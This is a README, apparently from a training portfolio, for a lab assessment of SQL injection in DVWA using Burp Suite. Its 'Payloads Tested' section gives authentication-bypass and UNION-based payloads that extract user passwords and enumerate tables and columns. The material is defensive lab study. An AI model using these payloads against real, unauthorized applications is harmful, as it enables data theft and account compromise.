# SQL Injection Assessment

## Overview

This directory documents the assessment of the **SQL Injection (SQLi)** vulnerability in the **Damn Vulnerable Web Application (DVWA)** performed within an isolated laboratory environment.

The objective of this assessment was to determine whether user-controlled input could manipulate backend SQL queries, allowing unauthorized access to database information. Testing was performed using **Burp Suite**, manual payload injection, and controlled validation techniques.

---

## Objective

- Identify SQL Injection vulnerabilities.
- Capture and analyze HTTP requests using Burp Suite.
- Validate SQL query manipulation.
- Assess the potential impact of successful exploitation.
- Document findings and recommend remediation measures.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Target Application | Damn Vulnerable Web Application (DVWA) |
| Operating System | Kali Linux |
| Web Server | Apache |
| Database | MySQL |
| Proxy Tool | Burp Suite Community Edition |
| Browser | Firefox |
| Security Level | Low |

---

## Testing Methodology

1. Configure DVWA security level to **Low**.
2. Navigate to the **SQL Injection** module.
3. Capture the HTTP request using Burp Suite Proxy.
4. Send the request to Burp Repeater.
5. Modify the vulnerable parameter with SQL Injection payloads.
6. Analyze server responses.
7. Verify successful SQL Injection.
8. Document findings and remediation recommendations.

---

## Payloads Tested

### Basic Authentication Bypass

```sql
' OR '1'='1
```

### UNION-Based SQL Injection

```sql
1' UNION SELECT user, password FROM users-- -
```

### Database Enumeration

```sql
1' UNION SELECT database(), version()-- -
```

### Table Enumeration

```sql
1' UNION SELECT table_name, NULL
FROM information_schema.tables
WHERE table_schema=database()-- -
```

### Column Enumeration

```sql
1' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name='users'-- -
```

> These payloads were executed only within the intentionally vulnerable DVWA laboratory environment for educational purposes.

---

## Key Findings

- Successfully identified a SQL Injection vulnerability.
- Verified improper handling of user-supplied input.
- Retrieved database information through UNION-based SQL Injection.
- Enumerated database tables and columns.
- Extracted user records stored in the database.
- Confirmed the absence of parameterized queries and insufficient input validation.

---

## Skills Demonstrated

- Burp Suite Proxy
- Burp Suite Repeater
- HTTP Request & Response Analysis
- SQL Injection Testing
- Database Enumeration
- UNION-Based SQL Injection
- OWASP Top 10 Awareness
- Technical Documentation
- Vulnerability Reporting

---

## Repository Contents

```
sql-injection/

├── README.md
├── findings.md
├── remediation.md
├── report.md
├── screenshots.md
└── screenshots/
```

---

## Supporting Documentation

- **Findings:** `findings.md`
- **Remediation:** `remediation.md`
- **Assessment Report:** `report.md`
- **Evidence:** `screenshots.md`

---

## Learning Outcomes

This assessment provided practical experience in:

- Identifying SQL Injection vulnerabilities.
- Understanding how unsanitized input affects SQL queries.
- Enumerating database structure through manual testing.
- Using Burp Suite to intercept and modify HTTP requests.
- Producing professional vulnerability assessment documentation.

---

## References

- OWASP Top 10 2021 – A03: Injection
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

---

## Disclaimer

This assessment was conducted **only within an authorized DVWA laboratory environment** for educational purposes. All testing was performed against an intentionally vulnerable application running in a local virtual machine. No unauthorized systems or production environments were targeted.
